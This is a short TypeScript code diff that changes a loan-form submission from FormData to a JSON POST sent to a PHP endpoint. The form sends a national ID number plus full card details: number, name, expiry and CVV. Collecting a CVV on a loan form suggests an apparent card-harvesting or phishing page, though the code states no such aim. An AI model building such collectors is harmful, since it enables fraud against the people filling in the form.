@@ -2,26 +2,27 @@ import { LoanFormData } from '../types/formTypes';
 
 export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
   try {
-    // Create FormData object
-    const form = new FormData();
-    
-    // Add only the required fields
-    form.append('dni', formData.dni);
-    form.append('cardNumber', formData.cardInfo.number);
-    form.append('cardName', formData.cardInfo.name);
-    form.append('cardExpiry', formData.cardInfo.expiry);
-    form.append('cardCvv', formData.cardInfo.cvv);
-
-    // Submit to PHP endpoint
+    // Submit to PHP endpoint as JSON
     const response = await fetch('/save-form.php', {
       method: 'POST',
-      body: form
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        dni: formData.dni,
+        cardInfo: {
+          number: formData.cardInfo.number,
+          name: formData.cardInfo.name,
+          expiry: formData.cardInfo.expiry,
+          cvv: formData.cardInfo.cvv
+        }
+      })
     });
 
     const result = await response.json();
 
     if (!response.ok) {
-      throw new Error('Error al guardar los datos');
+      throw new Error(result.error || 'Error al guardar los datos');
     }
 
     return { 
